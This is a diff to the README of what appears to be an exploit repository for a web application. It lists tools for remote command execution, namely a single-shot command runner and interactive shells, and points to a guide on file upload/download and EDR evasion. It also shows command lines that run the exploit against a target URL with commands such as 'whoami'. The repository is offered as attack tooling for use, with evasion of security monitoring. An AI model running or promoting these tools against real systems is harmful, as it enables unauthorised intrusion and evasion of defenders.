@@ -74,11 +74,29 @@ app/
 └── layout.js            # Root layout
 ```
 
-## Running the Exploit
+## Exploit Tools
 
-> **For detailed exploitation guide including interactive shell and advanced features, see [more-about-exploit.md](more-about-exploit.md)**
+This repository provides multiple exploitation tools:
 
-### Basic Usage
+1. **`exploit.py`** - Single-shot command execution
+2. **`interactive_exploit.py`** - Legacy interactive shell
+3. **`exploit_tool/`** - **Modular interactive shell (recommended)**
+
+> **For detailed guide including interactive shell, upload/download, and EDR evasion techniques, see [more-about-exploit.md](more-about-exploit.md)**
+
+### Running the Exploit
+
+**Modular Interactive Shell (Recommended):**
+
+```bash
+# Run interactive shell
+python run_exploit.py -t http://localhost:3000
+
+# With custom timeout
+python run_exploit.py -t http://localhost:3000 -T 30
+```
+
+**Single-shot Command:**
 
 ```bash
 python3 exploit.py -t http://localhost:3000 -c "whoami"
